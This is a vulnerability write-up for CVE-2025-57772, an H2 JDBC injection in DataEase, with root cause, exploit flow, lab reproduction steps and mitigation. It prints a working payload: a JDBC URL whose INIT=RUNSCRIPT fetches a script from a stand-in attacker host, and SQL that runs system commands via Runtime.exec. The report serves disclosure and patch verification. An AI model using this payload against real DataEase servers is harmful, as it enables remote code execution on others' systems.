# CVE-2025-57772 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-57772
- **Affected Software**: DataEase
- **Affected Versions**: <= 2.10.11
- **Fixed Version**: 2.10.12
- **Vulnerability Type**: CWE-94 (Code Injection)
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Description

DataEase is an open source business intelligence and data visualization tool. Prior to version 2.10.12, there is a H2 JDBC RCE bypass vulnerability. By setting the datasource type to "oracle" while providing an H2 JDBC URL with the driver set to "org.h2.Driver", attackers can bypass H2's URL filtering logic. This allows remote code execution via the INIT=RUNSCRIPT parameter in the H2 JDBC URL.

## Technical Details

### Root Cause

The vulnerability exists in the `CalciteProvider#getConnection` method:

1. When type is set to "oracle", the application enters the oracle case branch for JDBC URL validation
2. The oracle validation logic does not filter H2-specific parameters (INIT, RUNSCRIPT)
3. The `getJdbcUrl` method returns the user-provided JDBC URL directly
4. By specifying `"driver":"org.h2.Driver"` in the configuration, the H2 driver is used to establish the connection
5. H2's INIT=RUNSCRIPT parameter allows loading and executing arbitrary SQL from a remote URL

### Exploit Flow

1. Attacker logs in to DataEase (requires valid credentials)
2. Sends POST request to `/de2api/datasource/validate`
3. Sets `type` to "oracle" to bypass H2 filtering
4. Provides H2 JDBC URL in `jdbcUrl` field with INIT=RUNSCRIPT pointing to attacker's server
5. Sets `driver` to "org.h2.Driver"
6. DataEase fetches the SQL file and executes it via H2
7. SQL file contains Java code that executes system commands via Runtime.exec()

### Payload Structure

```json
{
  "type": "oracle",
  "configuration": "<base64 encoded config>"
}
```

Decoded configuration:
```json
{
  "driver": "org.h2.Driver",
  "jdbcUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'",
  "urlType": "jdbcUrl"
}
```

poc.sql content:
```sql
CREATE ALIAS IF NOT EXISTS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('command');
```

## Reproduction Steps

1. Start the vulnerable DataEase environment:
   ```bash
   docker-compose up -d
   ```

2. Wait for DataEase to fully start (~2 minutes)

3. Run the PoC:
   ```bash
   python poc.py -t http://target:8100 -c callback_ip --port 8888 --cmd "touch /tmp/pwned"
   ```

4. Verify command execution:
   ```bash
   docker exec dataease-cve-2025-57772 ls -la /tmp/pwned
   ```

## Test Results

- **Environment**: DataEase v2.10.11
- **Test Date**: 2026-02-04
- **Result**: VULNERABLE
- **Evidence**: Successfully created file `/tmp/pwned_cve2025_57772` in target container via remote code execution

## Mitigation

Upgrade DataEase to version 2.10.12 or later.

## References

- GitHub Security Advisory: GHSA-v37q-vh67-9rqv
- Patch Commit: https://github.com/dataease/dataease/commit/1644d81dff46272b09570fa1f4a8f83f01f37440
